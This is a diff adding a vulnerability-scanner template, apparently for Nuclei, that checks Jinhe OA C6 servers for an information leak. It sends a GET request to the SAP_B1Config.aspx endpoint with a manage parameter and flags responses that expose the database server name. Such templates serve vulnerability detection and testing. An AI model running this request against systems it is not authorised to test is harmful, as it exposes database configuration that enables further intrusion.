@@ -1,0 +1,21 @@
+id: jinhe-oa-SAP_B1Config-infoleak
+ 
+info:
+  name: 金和OA-C6-信息泄露-SAP_B1Config
+  author: HuanXiong
+  severity: high
+
+  tags: Information Disclosure
+
+http:
+  - raw:
+      - |-
+        GET /C6/JHsoft.CostEAI/SAP_B1Config.aspx/?manage=1 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
+        Connection: close
+ 
+    matchers:
+      - type: dsl
+        dsl:
+          - "contains_all(body, '数据库服务器名') && status_code==200"
